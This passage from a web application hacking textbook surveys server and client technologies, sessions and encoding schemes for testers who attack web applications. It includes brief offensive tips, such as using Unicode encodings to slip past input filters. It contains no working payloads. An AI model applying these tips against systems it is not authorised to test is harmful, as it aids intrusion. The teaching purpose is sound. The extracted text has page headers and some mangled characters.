c03.indd 52 c03.indd 52 8/19/2011 12:03:45 PM 8/19/2011 12:03:45 PM
Stuttard c03.indd V3 - 07/22/2011 Page 53
 Chapter 3 n Web Application Technologies 53
Second, because a framework typically employs plug-ins and packages 
from the cutting edge of the latest repositories, it is likely that these packages 
have not undergone security review. Interestingly, if a vulnerability is later 
found in the application, the same proponents of the myth will readily swap 
sides and blame their framework or third-party package!
The Java Platform
For many years, the Java Platform, Enterprise Edition (formerly known as J2EE) 
was a de facto standard for large-scale enterprise applications. Originally developed by Sun Microsystems and now owned by Oracle, it lends itself to multitiered 
and load-balanced architectures and is well suited to modular development and 
code reuse. Because of its long history and widespread adoption, many highquality development tools, application servers, and frameworks are available to 
assist developers. The Java Platform can be run on several underlying operating 
systems, including Windows, Linux, and Solaris.
Descriptions of Java-based web applications often employ a number of potentially confusing terms that you may need to be aware of:
n An Enterprise Java Bean (EJB) is a relatively heavyweight software component that encapsulates the logic of a specifi c business function within the 
application. EJBs are intended to take care of various technical challenges 
that application developers must address, such as transactional integrity.
n A Plain Old Java Object (POJO) is an ordinary Java object, as distinct 
from a special object such as an EJB. A POJO normally is used to denote 
objects that are user-defi ned and are much simpler and more lightweight 
than EJBs and those used in other frameworks.
n A Java Servlet is an object that resides on an application server and receives 
HTTP requests from clients and returns HTTP responses. Servlet implementations can use numerous interfaces to facilitate the development of 
useful applications.
n A Java web container is a platform or engine that provides a runtime 
environment for Java-based web applications. Examples of Java web containers are Apache Tomcat, BEA WebLogic, and JBoss.
Many Java web applications employ third-party and open source components 
alongside custom-built code. This is an attractive option because it reduces 
development effort, and Java is well suited to this modular approach. Here are 
some examples of components commonly used for key application functions:
n Authentication ‚Äî JAAS, ACEGI
n Presentation layer ‚Äî SiteMesh, Tapestry
c03.indd 53 c03.indd 53 8/19/2011 12:03:45 PM 8/19/2011 12:03:45 PM
Stuttard c03.indd V3 - 07/22/2011 Page 54
54 Chapter 3 n Web Application Technologies
n Database object relational mapping ‚Äî Hibernate
n Logging ‚Äî Log4J
If you can determine which open source packages are used in the application 
you are attacking, you can download these and perform a code review or install 
them to experiment on. A vulnerability in any of these may be exploitable to 
compromise the wider application.
ASP.NET
ASP.NET is Microsoft‚Äôs web application framework and is a direct competitor 
to the Java Platform. ASP.NET is several years younger than its counterpart but 
has made signifi cant inroads into Java‚Äôs territory.
ASP.NET uses Microsoft‚Äôs .NET Framework, which provides a virtual machine 
(the Common Language Runtime) and a set of powerful APIs. Hence, ASP.NET 
applications can be written in any .NET language, such as C# or VB.NET.
ASP.NET lends itself to the event-driven programming paradigm that is 
normally used in conventional desktop software, rather than the script-based 
approach used in most earlier web application frameworks. This, together with 
the powerful development tools provided with Visual Studio, makes developing a functional web application extremely easy for anyone with minimal 
programming skills.
The ASP.NET framework helps protect against some common web application 
vulnerabilities such as cross-site scripting, without requiring any effort from 
the developer. However, one practical downside of its apparent simplicity is that 
many small-scale ASP.NET applications are actually created by beginners who 
lack any awareness of the core security problems faced by web applications.
PHP
The PHP language emerged from a hobby project (the acronym originally stood 
for ‚Äúpersonal home page‚Äù). It has since evolved almost unrecognizably into 
a highly powerful and rich framework for developing web applications. It is 
often used in conjunction with other free technologies in what is known as the 
LAMP stack (composed of Linux as the operating system, Apache as the web 
server, MySQL as the database server, and PHP as the programming language 
for the web application).
Numerous open source applications and components have been developed 
using PHP. Many of these provide off-the-shelf solutions for common application 
functions, which are often incorporated into wider custom-built applications:
n Bulletin boards ‚Äî PHPBB, PHP-Nuke
n Administrative front ends ‚Äî PHPMyAdmin
c03.indd 54 c03.indd 54 8/19/2011 12:03:45 PM 8/19/2011 12:03:45 PM
Stuttard c03.indd V3 - 07/22/2011 Page 55
 Chapter 3 n Web Application Technologies 55
n Web mail ‚Äî SquirrelMail, IlohaMail
n Photo galleries ‚Äî Gallery
n Shopping carts ‚Äî osCommerce, ECW-Shop
n Wikis ‚Äî MediaWiki, WakkaWikki
Because PHP is free and easy to use, it has often been the language of choice 
for many beginners writing web applications. Furthermore, the design and 
default confi guration of the PHP framework has historically made it easy for 
programmers to unwittingly introduce security bugs into their code. These 
factors have meant that applications written in PHP have suffered from a disproportionate number of security vulnerabilities. In addition, several defects 
have existed within the PHP platform itself that often could be exploited via 
applications running on it. See Chapter 19 for details on common defects arising in PHP applications.
Ruby on Rails
Rails 1.0 was released in 2005, with strong emphasis on Model-View-Controller 
architecture. A key strength of Rails is the breakneck speed with which 
fully fl edged data-driven applications can be created. If a developer follows the 
Rails coding style and naming conventions, Rails can autogenerate a model 
for database content, controller actions for modifying it, and default views for 
the application user. As with any highly functional new technology, several 
 vulnerabilities have been found in Ruby on Rails, including the ability to bypass 
a ‚Äúsafe mode,‚Äù analogous to that found in PHP.
More details on recent vulnerabilities can be found here:
www.ruby-lang.org/en/security/
SQL
Structured Query Language (SQL) is used to access data in relational databases, 
such as Oracle, MS-SQL server and MySQL. The vast majority of today‚Äôs web 
applications employ SQL-based databases as their back-end data store, and nearly 
all application functions involve interaction with these data stores in some way.
Relational databases store data in tables, each of which contains a number 
of rows and columns. Each column represents a data fi eld, such as ‚Äúname‚Äù or 
‚Äúe-mail address,‚Äù and each row represents an item with values assigned to some 
or all of these fi elds.
SQL uses queries to perform common tasks such as reading, adding, updating, and deleting data. For example, to retrieve a user‚Äôs e-mail address with a 
specifi ed name, an application might perform the following query:
select email from users where name = ‚Äòdaf‚Äô
c03.indd 55 c03.indd 55 8/19/2011 12:03:45 PM 8/19/2011 12:03:45 PM
Stuttard c03.indd V3 - 07/22/2011 Page 56
56 Chapter 3 n Web Application Technologies
To implement the functionality they need, web applications may incorporate 
user-supplied input into SQL queries that are executed by the back-end database. If this process is not carried out safely, attackers may be able to submit 
malicious input to interfere with the database and potentially read and write 
sensitive data. These attacks are described in Chapter 9, along with detailed 
explanations of the SQL language and how it can be used.
XML
Extensible Markup Language (XML) is a specifi cation for encoding data in a 
machine-readable form. Like any markup language, the XML format separates a document into content (which is data) and markup (which annotates 
the data).
Markup is primarily represented using tags, which may be start tags, end 
tags, or empty-element tags:
<tagname>
</tagname>
<tagname />
Start and end tags are paired into elements and may encapsulate document 
content or child elements:
<pet>ginger</pet>
<pets><dog>spot</dog><cat>paws</cat></pets>
Tags may include attributes, which are name/value pairs:
<data version=‚Äù2.1‚Äù><pets>...</pets></data>
XML is extensible in that it allows arbitrary tag and attribute names. XML 
documents often include a Document Type Defi nition (DTD), which defi nes 
the tags and attributes used in the documents and the ways in which they can 
be combined.
XML and technologies derived from it are used extensively in web applications, on both the server and client side, as described in later sections of this 
chapter.
Web Services
Although this book covers web application hacking, many of the vulnerabilities 
described are equally applicable to web services. In fact, many applications are 
essentially a GUI front-end to a set of back-end web services.
c03.indd 56 c03.indd 56 8/19/2011 12:03:45 PM 8/19/2011 12:03:45 PM
Stuttard c03.indd V3 - 07/22/2011 Page 57
 Chapter 3 n Web Application Technologies 57
Web services use Simple Object Access Protocol (SOAP) to exchange data. 
SOAP typically uses the HTTP protocol to transmit messages and represents 
data using the XML format.
A typical SOAP request is as follows:
POST /doTransfer.asp HTTP/1.0
Host: mdsec-mgr.int.mdsec.net
Content-Type: application/soap+xml; charset=utf-8
Content-Length: 891
<?xml version=‚Äù1.0‚Äù?>
<soap:Envelope xmlns:soap=‚Äùhttp://www.w3.org/2001/12/soap-envelope‚Äù>
 <soap:Body>
 <pre:Add xmlns:pre=http://target/lists soap:encodingStyle=
‚Äúhttp://www.w3.org/2001/12/soap-encoding‚Äù>
 <Account>
 <FromAccount>18281008</FromAccount>
 <Amount>1430</Amount>
 <ClearedFunds>False</ClearedFunds>
 <ToAccount>08447656</ToAccount>
 </Account>
 </pre:Add>
 </soap:Body>
</soap:Envelope>
In the context of web applications accessed using a browser, you are most 
likely to encounter SOAP being used by the server-side application to communicate with various back-end systems. If user-supplied data is incorporated 
directly into back-end SOAP messages, similar vulnerabilities can arise as for 
SQL. These issues are described in detail in Chapter 10.
If a web application also exposes web services directly, these are also worthy 
of examination. Even if the front-end application is simply written on top of the 
web service, differences may exist in input handling and in the functionality 
exposed by the services themselves. The server normally publishes the available 
services and parameters using the Web Services Description Language (WSDL) 
format. Tools such as soapUI can be used to create sample requests based on a 
published WSDL fi le to call the authentication web service, gain an authentication token, and make any subsequent web service requests.
Client-Side Functionality
For the server-side application to receive user input and actions and present 
the results to the user, it needs to provide a client-side user interface. Because 
all web applications are accessed via a web browser, these interfaces all share a 
c03.indd 57 c03.indd 57 8/19/2011 12:03:45 PM 8/19/2011 12:03:45 PM
Stuttard c03.indd V3 - 07/22/2011 Page 58
58 Chapter 3 n Web Application Technologies
common core of technologies. However, these have been built upon in various, 
diverse ways, and the ways in which applications leverage client-side technology has continued to evolve rapidly in recent years.
HTML
The core technology used to build web interfaces is hypertext markup language 
(HTML). Like XML, HTML is a tag-based language that is used to describe the 
structure of documents that are rendered within the browser. From its simple 
beginnings as a means of providing basic formatting for text documents, HTML 
has developed into a rich and powerful language that can be used to create 
highly complex and functional user interfaces.
XHTML is a development of HTML that is based on XML and that has a stricter 
specifi cation than older versions of HTML. Part of the motivation for XHTML 
was the need to move toward a more rigid standard for HTML markup to avoid 
the various compromises and security issues that can arise when browsers are 
obligated to tolerate less-strict forms of HTML.
More details about HTML and related technologies appear in the following 
sections.
Hyperlinks
A large amount of communication from client to server is driven by the user‚Äôs 
clicking on hyperlinks. In web applications, hyperlinks frequently contain preset 
request parameters. These are items of data that the user never enters; they are 
submitted because the server places them into the target URL of the hyperlink 
that the user clicks. For example, a web application might present a series of 
links to news stories, each having the following form:
<a href=‚Äù?redir=/updates/update29.html‚Äù>What‚Äôs happening?</a>
When a user clicks this link, the browser makes the following request:
GET /news/8/?redir=/updates/update29.html HTTP/1.1
Host: mdsec.net
...
The server receives the redir parameter in the query string and uses its value 
to determine what content should be presented to the user.
Forms
Although hyperlink-based navigation is responsible for a large amount of clientto-server communications, most web applications need more fl exible ways 
to gather input and receive actions from users. HTML forms are the usual 
c03.indd 58 c03.indd 58 8/19/2011 12:03:45 PM 8/19/2011 12:03:45 PM
Stuttard c03.indd V3 - 07/22/2011 Page 59
 Chapter 3 n Web Application Technologies 59
mechanism for allowing users to enter arbitrary input via their browser. A 
typical form is as follows:
<form action=‚Äù/secure/login.php?app=quotations‚Äù method=‚Äùpost‚Äù>
username: <input type=‚Äùtext‚Äù name=‚Äùusername‚Äù><br>
password: <input type=‚Äùpassword‚Äù name=‚Äùpassword‚Äù>
<input type=‚Äùhidden‚Äù name=‚Äùredir‚Äù value=‚Äù/secure/home.php‚Äù>
<input type=‚Äùsubmit‚Äù name=‚Äùsubmit‚Äù value=‚Äùlog in‚Äù>
</form>
When the user enters values into the form and clicks the Submit button, the 
browser makes a request like the following:
POST /secure/login.php?app=quotations HTTP/1.1
Host: wahh-app.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Cookie: SESS=GTnrpx2ss2tSWSnhXJGyG0LJ47MXRsjcFM6Bd
username=daf&password=foo&redir=/secure/home.php&submit=log+in
In this request, several points of interest refl ect how different aspects of the 
request are used to control server-side processing:
n Because the HTML form tag contains an attribute specifying the POST
method, the browser uses this method to submit the form and places the 
data from the form into the body of the request message.
n In addition to the two items of data that the user enters, the form contains 
a hidden parameter (redir) and a submit parameter (submit). Both of 
these are submitted in the request and may be used by the server-side 
application to control its logic.
n The target URL for the form submission contains a preset parameter (app),
as in the hyperlink example shown previously. This parameter may be 
used to control the server-side processing.
n The request contains a cookie parameter (SESS), which was issued to the 
browser in an earlier response from the server. This parameter may be 
used to control the server-side processing.
The preceding request contains a header specifying that the type of content in 
the message body is x-www-form-urlencoded. This means that parameters are 
represented in the message body as name/value pairs in the same way as they 
are in the URL query string. The other content type you are likely to encounter when form data is submitted is multipart/form-data. An application can 
request that browsers use multipart encoding by specifying this in an enctype
attribute in the form tag. With this form of encoding, the Content-Type header 
in the request also specifi es a random string that is used as a separator for the 
c03.indd 59 c03.indd 59 8/19/2011 12:03:45 PM 8/19/2011 12:03:45 PM
Stuttard c03.indd V3 - 07/22/2011 Page 60
60 Chapter 3 n Web Application Technologies
parameters contained in the request body. For example, if the form specifi ed 
multipart encoding, the resulting request would look like the following:
POST /secure/login.php?app=quotations HTTP/1.1
Host: wahh-app.com
Content-Type: multipart/form-data; boundary=------------7d71385d0a1a
Content-Length: 369
Cookie: SESS=GTnrpx2ss2tSWSnhXJGyG0LJ47MXRsjcFM6Bd
------------7d71385d0a1a
Content-Disposition: form-data; name=‚Äùusername‚Äù
daf
------------7d71385d0a1a
Content-Disposition: form-data; name=‚Äùpassword‚Äù
foo
------------7d71385d0a1a
Content-Disposition: form-data; name=‚Äùredir‚Äù
/secure/home.php
------------7d71385d0a1a
Content-Disposition: form-data; name=‚Äùsubmit‚Äù
log in
------------7d71385d0a1a--
CSS
Cascading Style Sheets (CSS) is a language used to describe the presentation of a 
document written in a markup language. Within web applications, it is used to 
specify how HTML content should be rendered on-screen (and in other media, 
such as the printed page).
Modern web standards aim to separate as much as possible the content of a 
document from its presentation. This separation has numerous benefi ts, including simpler and smaller HTML pages, easier updating of formatting across a 
website, and improved accessibility.
CSS is based on formatting rules that can be defi ned with different levels 
of specifi city. Where multiple rules match an individual document element, 
different attributes defi ned in those rules can ‚Äúcascade‚Äù through these rules so 
that the appropriate combination of style attributes is applied to the element.
CSS syntax uses selectors to defi ne a class of markup elements to which 
a given set of attributes should be applied. For example, the following 
CSS rule defi nes the foreground color for headings that are marked up using 
<h2> tags:
h2 { color: red; }
c03.indd 60 c03.indd 60 8/19/2011 12:03:45 PM 8/19/2011 12:03:45 PM
Stuttard c03.indd V3 - 07/22/2011 Page 61
 Chapter 3 n Web Application Technologies 61
In the earliest days of web application security, CSS was largely overlooked 
and was considered to have no security implications. Today, CSS is increasingly 
relevant both as a source of security vulnerabilities in its own right and as a 
means of delivering effective exploits for other categories of vulnerabilities (see 
Chapters 12 and 13 for more information).
JavaScript
Hyperlinks and forms can be used to create a rich user interface that can easily 
gather most kinds of input that web applications require. However, most applications employ a more distributed model, in which the client side is used not 
simply to submit user data and actions but also to perform actual processing 
of data. This is done for two primary reasons:
n It can improve the application‚Äôs performance, because certain tasks can 
be carried out entirely on the client component, without needing to make 
a round trip of request and response to the server.
n It can enhance usability, because parts of the user interface can be dynamically updated in response to user actions, without needing to load an 
entirely new HTML page delivered by the server.
JavaScript is a relatively simple but powerful programming language that 
can be easily used to extend web interfaces in ways that are not possible using 
HTML alone. It is commonly used to perform the following tasks:
n Validating user-entered data before it is submitted to the server to avoid 
unnecessary requests if the data contains errors
n Dynamically modifying the user interface in response to user actions ‚Äî for 
example, to implement drop-down menus and other controls familiar 
from non-web interfaces
n Querying and updating the document object model (DOM) within the 
browser to control the browser‚Äôs behavior (the browser DOM is described 
in a moment)
VBScript
VBScript is an alternative to JavaScript that is supported only in the Internet 
Explorer browser. It is modeled on Visual Basic and allows interaction with 
the browser DOM. But in general it is somewhat less powerful and developed 
than JavaScript.
Due to its browser-specifi c nature, VBScript is scarcely used in today‚Äôs web 
applications. Its main interest from a security perspective is as a means of 
delivering exploits for vulnerabilities such as cross-site scripting in occasional 
situations where an exploit using JavaScript is not feasible (see Chapter 12).
c03.indd 61 c03.indd 61 8/19/2011 12:03:45 PM 8/19/2011 12:03:45 PM
Stuttard c03.indd V3 - 07/22/2011 Page 62
62 Chapter 3 n Web Application Technologies
Document Object Model
The Document Object Model (DOM) is an abstract representation of an HTML 
document that can be queried and manipulated through its API.
The DOM allows client-side scripts to access individual HTML elements by 
their id and to traverse the structure of elements programmatically. Data such 
as the current URL and cookies can also be read and updated. The DOM also 
includes an event model, allowing code to hook events such as form submission, 
navigation via links, and keystrokes.
Manipulation of the browser DOM is a key technique used in Ajax-based 
applications, as described in the following section.
Ajax
Ajax is a collection of programming techniques used on the client side to create 
user interfaces that aim to mimic the smooth interaction and dynamic behavior 
of traditional desktop applications.
The name originally was an acronym for ‚ÄúAsynchronous JavaScript and 
XML,‚Äù although in today‚Äôs web Ajax requests need not be asynchronous and 
need not employ XML.
The earliest web applications were based on complete pages. Each user action, 
such as clicking a link or submitting a form, initiated a window-level navigation 
event, causing a new page to be loaded from the server. This approach resulted 
in a disjointed user experience, with noticeable delays while large responses 
were received from the server and the whole page was rerendered.
With Ajax, some user actions are handled within client-side script code and 
do not cause a full reload of the page. Instead, the script performs a request ‚Äúin 
the background‚Äù and typically receives a much smaller response that is used to 
dynamically update only part of the user interface. For example, in an Ajax-based 
shopping application, clicking an Add to Cart button may cause a background 
request that updates the server-side record of the user‚Äôs shopping cart and a 
lightweight response that updates the number of cart items showing on the 
user‚Äôs screen. Virtually the entire existing page remains unmodifi ed within the 
browser, providing a much faster and more satisfying experience for the user.
The core technology used in Ajax is XMLHttpRequest. After a certain consolidation of standards, this is now a native JavaScript object that client-side scripts can 
use to make ‚Äúbackground‚Äù requests without requiring a window-level navigation event. Despite its name, XMLHttpRequest allows arbitrary content to be sent 
in requests and received in responses. Although many Ajax applications do use 
XML to format message data, an increasing number have opted to exchange data 
using other methods of representation. (See the next section for one example.)
Note that although most Ajax applications do use asynchronous communications with the server, this is not essential. In some situations, it may actually make 
c03.indd 62 c03.indd 62 8/19/2011 12:03:45 PM 8/19/2011 12:03:45 PM
Stuttard c03.indd V3 - 07/22/2011 Page 63
 Chapter 3 n Web Application Technologies 63
more sense to prevent user interaction with the application while a particular 
action is carried out. In these situations, Ajax is still benefi cial in providing a 
more seamless experience by avoiding the need to reload an entire page.
Historically, the use of Ajax has introduced some new types of vulnerabilities into web applications. More broadly, it also increases the attack surface of 
a typical application by introducing more potential targets for attack on both 
the server and client side. Ajax techniques are also available for use by attackers when they are devising more effective exploits for other vulnerabilities. See 
Chapters 12 and 13 for more details.
JSON
JavaScript Object Notation (JSON) is a simple data transfer format that can 
be used to serialize arbitrary data. It can be processed directly by JavaScript 
interpreters. It is commonly employed in Ajax applications as an alternative to 
the XML format originally used for data transmission. In a typical situation, 
when a user performs an action, client-side JavaScript uses XMLHttpRequest to 
communicate the action to the server. The server returns a lightweight response 
containing data in JSON format. The client-side script then processes this data 
and updates the user interface accordingly.
For example, an Ajax-based web mail application may contain a feature to 
show the details of a selected contact. When a user clicks a contact, the browser 
uses XMLHttpRequest to retrieve the details of the selected contact, which are 
returned using JSON:
{
 ‚Äúname‚Äù: ‚ÄúMike Kemp‚Äù,
 ‚Äúid‚Äù: ‚Äú8041148671‚Äù,
 ‚Äúemail‚Äù: ‚Äúfkwitt@layerone.com‚Äù
}
The client-side script uses the JavaScript interpreter to consume the JSON 
response and updates the relevant part of the user interface based on its contents.
A further location where you may encounter JSON data in today‚Äôs applications 
is as a means of encapsulating data within conventional request parameters. For 
example, when the user updates the details of a contact, the new information 
might be communicated to the server using the following request:
POST /contacts HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 89
Contact={‚Äúname‚Äù:‚ÄùMike Kemp‚Äù,‚Äùid‚Äù:‚Äù8041148671‚Äù,‚Äùemail‚Äù:‚Äùpikey@
clappymonkey.com‚Äù}
&submit=update
c03.indd 63 c03.indd 63 8/19/2011 12:03:45 PM 8/19/2011 12:03:45 PM
Stuttard c03.indd V3 - 07/22/2011 Page 64
64 Chapter 3 n Web Application Technologies
Same-Origin Policy
The same-origin policy is a key mechanism implemented within browsers that 
is designed to keep content that came from different origins from interfering 
with each other. Basically, content received from one website is allowed to read 
and modify other content received from the same site but is not allowed to 
access content received from other sites.
If the same-origin policy did not exist, and an unwitting user browsed to a 
malicious website, script code running on that site could access the data and 
functionality of any other website also visited by the user. This may enable the 
malicious site to perform funds transfers from the user‚Äôs online bank, read his 
or her web mail, or capture credit card details when the user shops online. For 
this reason, browsers implement restrictions to allow this type of interaction 
only with content that has been received from the same origin.
In practice, applying this concept to the details of different web features and 
technologies leads to various complications and compromises. Here are some 
key features of the same-origin policy that you need to be aware of:
n A page residing on one domain can cause an arbitrary request to be made 
to another domain (for example, by submitting a form or loading an 
image). But it cannot itself process the data returned from that request.
n A page residing on one domain can load a script from another domain and 
execute this within its own context. This is because scripts are assumed 
to contain code, rather than data, so cross-domain access should not lead 
to disclosure of any sensitive information.
n A page residing on one domain cannot read or modify the cookies or 
other DOM data belonging to another domain.
These features can lead to various cross-domain attacks, such as inducing 
user actions and capturing data. Further complications arise with browser 
extension technologies, which implement same-origin restrictions in different 
ways. These issues are discussed in detail in Chapter 13.
HTML5
HTML5 is a major update to the HTML standard. HTML5 currently is still under 
development and is only partially implemented within browsers.
From a security perspective, HTML5 is primarily of interest for the following reasons:
n It introduces various new tags, attributes, and APIs that can be leveraged to deliver cross-site scripting and other attacks, as described in 
Chapter 12.
c03.indd 64 c03.indd 64 8/19/2011 12:03:45 PM 8/19/2011 12:03:45 PM
Stuttard c03.indd V3 - 07/22/2011 Page 65
 Chapter 3 n Web Application Technologies 65
n It modifi es the core Ajax technology, XMLHttpRequest, to enable two-way 
cross-domain interaction in certain situations. This can lead to new crossdomain attacks, as described in Chapter 13.
n It introduces new mechanisms for client-side data storage, which can lead 
to user privacy issues, and new categories of attack such as client-side SQL 
injection, as described in Chapter 13.
‚ÄúWeb 2.0‚Äù
This buzzword has become fashionable in recent years as a rather loose and 
nebulous name for a range of related trends in web applications, including the 
following:
n Heavy use of Ajax for performing asynchronous, behind-the-scenes requests
n Increased cross-domain integration using various techniques
n Use of new technologies on the client side, including XML, JSON, and Flex
n More prominent functionality supporting user-generated content, information sharing, and interaction
As with all changes in technology, these trends present new opportunities 
for security vulnerabilities to arise. However, they do not defi ne a clear subset 
of web application security issues in general. The vulnerabilities that occur in 
these contexts are largely the same as, or closely derived from, types of vulnerabilities that preceded these trends. In general, talking about ‚ÄúWeb 2.0 Security‚Äù 
usually represents a category mistake that does not facilitate clear thinking 
about the issues that matter.
Browser Extension Technologies
Going beyond the capabilities of JavaScript, some web applications employ 
browser extension technologies that use custom code to extend the browser‚Äôs 
built-in capabilities in arbitrary ways. These components may be deployed as 
bytecode that is executed by a suitable browser plug-in or may involve installing 
native executables onto the client computer itself. The thick-client technologies 
you are likely to encounter when attacking web applications are
n Java applets
n ActiveX controls
n Flash objects
n Silverlight objects
These technologies are described in detail in Chapter 5.
c03.indd 65 c03.indd 65 8/19/2011 12:03:45 PM 8/19/2011 12:03:45 PM
Stuttard c03.indd V3 - 07/22/2011 Page 66
66 Chapter 3 n Web Application Technologies
State and Sessions
The technologies described so far enable the server and client components of 
a web application to exchange and process data in numerous ways. To implement most kinds of useful functionality, however, applications need to track the 
state of each user‚Äôs interaction with the application across multiple requests. For 
example, a shopping application may allow users to browse a product catalog, 
add items to a cart, view and update the cart contents, proceed to checkout, and 
provide personal and payment details.
To make this kind of functionality possible, the application must maintain a 
set of stateful data generated by the user‚Äôs actions across several requests. This 
data normally is held within a server-side structure called a session. When a 
user performs an action, such as adding an item to her shopping cart, the serverside application updates the relevant details within the user‚Äôs session. When the 
user later views the contents of her cart, data from the session is used to return 
the correct information to the user.
In some applications, state information is stored on the client component 
rather than the server. The current set of data is passed to the client in each 
server response and is sent back to the server in each client request. Of course, 
because the user may modify any data transmitted via the client component, 
applications need to protect themselves from attackers who may change this 
state information in an attempt to interfere with the application‚Äôs logic. The 
ASP.NET platform makes use of a hidden form fi eld called ViewState to store 
state information about the user‚Äôs web interface and thereby reduce overhead 
on the server. By default, the contents of the ViewState include a keyed hash 
to prevent tampering.
Because the HTTP protocol is itself stateless, most applications need a way to 
reidentify individual users across multiple requests for the correct set of state 
data to be used to process each request. Normally this is achieved by issuing 
each user a token that uniquely identifi es that user‚Äôs session. These tokens may 
be transmitted using any type of request parameter, but most applications use 
HTTP cookies. Several kinds of vulnerabilities arise in relation to session handling, as described in detail in Chapter 7.
Encoding Schemes
Web applications employ several different encoding schemes for their data. Both 
the HTTP protocol and the HTML language are historically text-based, and different encoding schemes have been devised to ensure that these mechanisms 
can safely handle unusual characters and binary data. When you are attacking 
a web application, you will frequently need to encode data using a relevant 
c03.indd 66 c03.indd 66 8/19/2011 12:03:46 PM 8/19/2011 12:03:46 PM
Stuttard c03.indd V3 - 07/22/2011 Page 67
 Chapter 3 n Web Application Technologies 67
scheme to ensure that it is handled in the way you intend. Furthermore, in many 
cases you may be able to manipulate the encoding schemes an application uses 
to cause behavior that its designers did not intend.
URL Encoding
URLs are permitted to contain only the printable characters in the US-ASCII 
character set ‚Äî that is, those whose ASCII code is in the range 0x20 to 0x7e, 
inclusive. Furthermore, several characters within this range are restricted because 
they have special meaning within the URL scheme itself or within the HTTP 
protocol.
The URL-encoding scheme is used to encode any problematic characters 
within the extended ASCII character set so that they can be safely transported 
over HTTP. The URL-encoded form of any character is the % prefi x followed by 
the character‚Äôs two-digit ASCII code expressed in hexadecimal. Here are some 
characters that are commonly URL-encoded:
n %3d ‚Äî =
n %25 ‚Äî %
n %20 ‚Äî Space
n %0a ‚Äî New line
n %00 ‚Äî Null byte
A further encoding to be aware of is the + character, which represents a 
 URL-encoded space (in addition to the %20 representation of a space).
NOTE For the purpose of attacking web applications, you should URLencode any of the following characters when you insert them as data into an 
HTTP request:
space % ? & = ; + #
(Of course, you will often need to use these characters with their special 
meaning when modifying a request ‚Äî for example, to add a request parameter 
to the query string. In this case, they should be used in their literal form.)
Unicode Encoding
Unicode is a character encoding standard that is designed to support all of the 
world‚Äôs writing systems. It employs various encoding schemes, some of which 
can be used to represent unusual characters in web applications.
16-bit Unicode encoding works in a similar way to URL encoding. For 
transmission over HTTP, the 16-bit Unicode-encoded form of a character is 
c03.indd 67 c03.indd 67 8/19/2011 12:03:46 PM 8/19/2011 12:03:46 PM
Stuttard c03.indd V3 - 07/22/2011 Page 68
68 Chapter 3 n Web Application Technologies
the %u prefi x followed by the character‚Äôs Unicode code point expressed in 
hexadecimal:
n %u2215 ‚Äî /
n %u00e9 ‚Äî √©
UTF-8 is a variable-length encoding standard that employs one or more bytes 
to express each character. For transmission over HTTP, the UTF-8-encoded form 
of a multibyte character simply uses each byte expressed in hexadecimal and 
preceded by the % prefi x:
n %c2%a9 ‚Äî ¬©
n %e2%89%a0 ‚Äî z
For the purpose of attacking web applications, Unicode encoding is primarily 
of interest because it can sometimes be used to defeat input validation mechanisms. If an input fi lter blocks certain malicious expressions, but the component 
that subsequently processes the input understands Unicode encoding, it may 
be possible to bypass the fi lter using various standard and malformed Unicode 
encodings.
HTML Encoding
HTML encoding is used to represent problematic characters so that they can be 
safely incorporated into an HTML document. Various characters have special 
meaning as metacharacters within HTML and are used to defi ne a document‚Äôs 
structure rather than its content. To use these characters safely as part of the 
document‚Äôs content, it is necessary to HTML-encode them.
HTML encoding defi nes numerous HTML entities to represent specifi c literal 
characters:
n &quot; ‚Äî "
n &apos; ‚Äî '
n &amp; ‚Äî &
n &lt; ‚Äî <
n &gt; ‚Äî >
In addition, any character can be HTML-encoded using its ASCII code in decimal form:
n &#34; ‚Äî "
n &#39; ‚Äî '
or by using its ASCII code in hexadecimal form (prefi xed by an x):
c03.indd 68 c03.indd 68 8/19/2011 12:03:46 PM 8/19/2011 12:03:46 PM
Stuttard c03.indd V3 - 07/22/2011 Page 69
 Chapter 3 n Web Application Technologies 69
n &#x22; ‚Äî "
n &#x27; ‚Äî '
When you are attacking a web application, your main interest in HTML 
encoding is likely to be when probing for cross-site scripting vulnerabilities. If 
an application returns user input unmodifi ed within its responses, it is probably vulnerable, whereas if dangerous characters are HTML-encoded, it may 
be safe. See Chapter 12 for more details on these vulnerabilities.
Base64 Encoding
Base64 encoding allows any binary data to be safely represented using only 
printable ASCII characters. It is commonly used to encode e-mail attachments 
for safe transmission over SMTP. It is also used to encode user credentials in 
basic HTTP authentication.
Base64 encoding processes input data in blocks of three bytes. Each of these 
blocks is divided into four chunks of six bits each. Six bits of data allows for 64 
different possible permutations, so each chunk can be represented using a set 
of 64 characters. Base64 encoding employs the following character set, which 
contains only printable ASCII characters:
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
If the fi nal block of input data results in fewer than three chunks of output 
data, the output is padded with one or two = characters.
For example, here is the Base64-encoded form of The Web Application Hacker‚Äôs
Handbook:
VGhlIFdlYiBBcHBsaWNhdGlvbiBIYWNrZXIncyBIYW5kYm9vaw==
Many web applications use Base64 encoding to transmit binary data within 
cookies and other parameters, and even to obfuscate (that is, to hide) sensitive 
data to prevent trivial modifi cation. You should always look out for, and decode, 
any Base64 data that is issued to the client. Base64-encoded strings can often 
be easily recognized by their specifi c character set and the presence of padding 
characters at the end of the string.
Hex Encoding
Many applications use straightforward hexadecimal encoding when transmitting binary data, using ASCII characters to represent the hexadecimal block. 
For example, hex-encoding the username ‚Äúdaf‚Äù within a cookie would result 
in this:
646166
c03.indd 69 c03.indd 69 8/19/2011 12:03:46 PM 8/19/2011 12:03:46 PM
Stuttard c03.indd V3 - 07/22/2011 Page 70
70 Chapter 3 n Web Application Technologies
As with Base64, hex-encoded data is usually easy to spot. You should always 
attempt to decode any such data that the server sends to the client to understand 
its function.
Remoting and Serialization Frameworks
In recent years, various frameworks have evolved for creating user interfaces in 
which client-side code can remotely access various programmatic APIs implemented on the server side. This allows developers to partly abstract away from 
the distributed nature of web applications and write code in a manner that is 
closer to the paradigm of a conventional desktop application. These frameworks 
typically provide stub APIs for use on the client side. They also automatically 
handle both the remoting of these API calls to the relevant server-side functions 
and the serialization of any data that is passed to those functions.
Examples of these kinds of remoting and serialization frameworks include 
the following:
n Flex and AMF
n Silverlight and WCF
n Java serialized objects
We will discuss techniques for working with these frameworks, and the kinds 
of security issues that can arise, in Chapters 4 and 5.
Next Steps
So far, we have described the current state of web application (in)security, examined the core mechanisms by which web applications can defend themselves, 
and taken a brief look at the key technologies employed in today‚Äôs applications. 
With this groundwork in place, we are now in a position to start looking at the 
